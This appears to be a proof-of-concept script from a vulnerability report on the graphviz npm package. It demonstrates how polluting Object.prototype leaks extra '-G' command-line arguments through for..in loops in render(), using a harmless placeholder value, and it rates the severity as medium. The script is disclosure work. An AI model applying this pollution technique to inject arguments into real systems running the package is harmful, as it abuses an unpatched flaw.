/**
 * PoC #3: CWE-1321 — Prototype Pollution via for..in in render()
 * Package: graphviz v0.0.9 (513K weekly downloads)
 *
 * The render() method in lib/deps/graph.js uses for..in loops to iterate
 * over option objects (lines 320, 329, 338):
 *
 *   for( attr in type_or_options.G ) {
 *     parameters.push( "-G"+attr+"="+type_or_options.G[attr] )
 *   }
 *
 * for..in iterates ALL enumerable properties, including those inherited
 * from Object.prototype. If Object.prototype has been polluted, additional
 * CLI arguments are injected into the graphviz command.
 */
const graphviz = require('graphviz');

console.log("=== Prototype Pollution → CLI Argument Injection ===\n");

// Step 1: Demonstrate the for..in behavior
console.log("Step 1: Normal render options");
const g = graphviz.digraph('test');
g.addNode('A');
g.addNode('B');
g.addEdge('A', 'B');

// Normal options
const normalOptions = {
  type: 'svg',
  G: { rankdir: 'LR', label: 'Test Graph' }
};

// Show what parameters would be generated
const normalParams = [];
for (var attr in normalOptions.G) {
  normalParams.push("-G" + attr + "=" + normalOptions.G[attr]);
}
normalParams.push('-T' + normalOptions.type);
console.log("Normal parameters:", normalParams);
console.log();

// Step 2: Pollute Object.prototype
console.log("Step 2: After Object.prototype pollution");
Object.prototype.injected = "malicious_value";

const pollutedParams = [];
for (var attr2 in normalOptions.G) {
  pollutedParams.push("-G" + attr2 + "=" + normalOptions.G[attr2]);
}
pollutedParams.push('-T' + normalOptions.type);
console.log("Polluted parameters:", pollutedParams);
console.log();

// The "injected" property from Object.prototype is now included!
// This adds "-Ginjected=malicious_value" to the CLI arguments

// Step 3: Impact analysis
console.log("Step 3: Impact");
console.log("- Extra '-G' arguments modify graph rendering");
console.log("- With -N and -E options, node/edge attributes are modified");
console.log("- Combined with other prototype pollution sources, enables");
console.log("  unintended modifications to graph output");
console.log();

// Cleanup
delete Object.prototype.injected;

// Step 4: Also check Attributs.to_dot() for..in usage
console.log("Step 4: Attributs.to_dot() also uses for..in");
console.log("File: lib/deps/attributs.js, line 244:");
console.log('  for(var name in this.attributs.items) {');
console.log("This iterates prototype chain too, but uses hasOwnProperty check.");
console.log("So Attributs.to_dot() is PARTIALLY protected (unlike render()).\n");

console.log("=== Summary ===");
console.log("Severity: MEDIUM (CVSS ~5.3)");
console.log("CWE-1321: Improperly Controlled Modification of Object Prototype Attributes");
console.log("Condition: Requires prior prototype pollution (e.g. from another vulnerability)");
console.log("Impact: Inject arbitrary CLI arguments to graphviz commands");
